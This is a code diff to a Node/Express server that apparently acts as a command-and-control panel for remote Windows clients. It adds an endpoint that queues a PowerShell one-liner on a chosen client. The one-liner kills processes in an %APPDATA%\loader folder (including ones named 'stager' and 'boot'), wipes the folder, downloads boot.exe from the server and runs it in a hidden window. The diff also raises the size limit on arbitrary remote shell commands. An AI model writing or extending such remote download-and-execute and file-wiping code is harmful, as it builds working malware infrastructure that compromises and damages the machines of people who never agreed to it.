@@ -357,11 +357,67 @@ app.get('/api/uploads/:id/download', limitDownload, requireAuth, (req, res) => {
   fs.createReadStream(src).pipe(res);
 });
 
+// helper: build the powershell wipe + reinstall command for a client
+// serverBase: http(s)://<host> that the client can reach (used for boot.exe download)
+function buildWipeCommand(serverBase) {
+  // Everything after the boot download + launch runs in a detached hidden
+  // PowerShell so that when it kills st.exe, the parent process is already gone.
+  // %APPDATA%\loader is the working dir. Kill everything by path, wait for
+  // lock release, wipe, download new boot, launch it.
+  const bootUrl = `${serverBase}/api/downloads/boot.exe`;
+
+  // Single-line PowerShell. Backticks are literal here (JS template string).
+  // We use single-quoted PS strings so JS backslashes don't get eaten.
+  const ps = [
+    `$dir = Join-Path $env:APPDATA 'loader'`,
+    `New-Item -ItemType Directory -Force -Path $dir | Out-Null`,
+    `Set-Location $dir`,
+    // kill by path — every exe whose full path is inside $dir
+    `Get-Process -ErrorAction SilentlyContinue | Where-Object { $_.Path -and $_.Path.StartsWith($dir, 'OrdinalIgnoreCase') } | Stop-Process -Force -ErrorAction SilentlyContinue`,
+    // belt-and-braces: kill by name in case path isn't readable for some
+    `Get-Process -Name 'st','boot','1','2','3','stager' -ErrorAction SilentlyContinue | Where-Object { $_.Path -and $_.Path.StartsWith($dir, 'OrdinalIgnoreCase') } | Stop-Process -Force -ErrorAction SilentlyContinue`,
+    `Start-Sleep -Milliseconds 800`,
+    // wipe with retry
+    `for ($i=0; $i -lt 5; $i++) { try { Remove-Item -Recurse -Force (Join-Path $dir '*') -ErrorAction Stop; break } catch { Start-Sleep -Milliseconds 400 } }`,
+    `Start-Sleep -Milliseconds 400`,
+    // fresh boot
+    `Invoke-WebRequest -Uri '${bootUrl}' -OutFile (Join-Path $dir 'boot.exe') -UseBasicParsing`,
+    `Start-Process -FilePath (Join-Path $dir 'boot.exe') -WorkingDirectory $dir -WindowStyle Hidden`,
+  ].join('; ');
+
+  return ps;
+}
+
+app.post('/api/clients/:id/wipe', requireAuth, (req, res) => {
+  const cid = Number(req.params.id);
+  const client = db.prepare(sql`SELECT id FROM clients WHERE id = ? AND user_id = ?`).get(cid, req.user.uid);
+  if (!client) return res.status(404).json({ error: 'client not found' });
+
+  // figure out the base URL the client should use for the boot.exe download.
+  // prefer an explicit override from the request body, else use the same host
+  // the dashboard is on (which the client already knows how to reach since it
+  // reports to it). fall back to the raw IP.
+  let base = req.body?.serverBase;
+  if (!base) {
+    const proto = req.secure || req.headers['x-forwarded-proto'] === 'https' ? 'https' : 'http';
+    base = `${proto}://${req.headers.host}`;
+  }
+
+  const line = buildWipeCommand(base);
+
+  const info = db.prepare(sql`
+    INSERT INTO commands (user_id, client_id, shell, line, status, created_at)
+    VALUES (?, ?, 'powershell', ?, 'pending', ?)
+  `).run(req.user.uid, cid, line, Date.now());
+
+  res.json({ ok: true, commandId: Number(info.lastInsertRowid), bytes: line.length });
+});
+
 app.post('/api/clients/:id/exec', requireAuth, (req, res) => {
   const clientId = Number(req.params.id);
   const { shell, line } = req.body || {};
   if (!['cmd', 'powershell'].includes(shell)) return res.status(400).json({ error: 'bad shell' });
-  if (typeof line !== 'string' || !line.trim() || line.length > 4096)
+  if (typeof line !== 'string' || !line.trim() || line.length > 8192)
     return res.status(400).json({ error: 'bad line' });
 
   const client = db.prepare(sql`SELECT id FROM clients WHERE id = ? AND user_id = ?`).get(clientId, req.user.uid);
